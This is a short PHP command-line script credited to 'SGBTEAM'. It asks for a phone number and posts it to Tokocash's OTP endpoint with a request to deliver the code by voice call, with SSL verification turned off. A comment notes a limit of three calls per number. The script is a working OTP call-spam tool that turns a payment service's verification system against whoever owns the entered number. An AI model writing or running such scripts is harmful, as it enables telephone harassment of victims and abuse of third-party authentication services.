&lt;?php<br>
<br>
// Limit 3x Telpon Setiap Satu Nomor<br>
<br>
function send($phone){<br>
<br>
$ch = curl_init();<br>
<br>
curl_setopt($ch, CURLOPT_URL, &quot;https://www.tokocash.com/oauth/otp&quot;); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);<br>
<br>
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);<br>
<br>
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br>
<br>
curl_setopt($ch, CURLOPT_HEADER, true);<br>
<br>
curl_setopt($ch, CURLOPT_POST, 1);<br>
<br>
curl_setopt($ch, CURLOPT_POSTFIELDS, &quot;msisdn=$phone&amp;accept=call&quot;); $asw = curl_exec($ch);<br>
<br>
curl_close($ch);<br>
<br>
echo $asw.&quot;\n&quot;;<br>
<br>
}<br>
<br>
echo &quot;COPYRIGHT ; SGBTEAM\n\n&quot;;<br>
<br>
echo &quot;Nomor\nInput : &quot;;<br>
<br>
$nomor = trim(fgets(STDIN));<br>
<br>
$execute = send($nomor);<br>
<br>
print $execute;<br>
<br>
?&gt;<br>
<br>
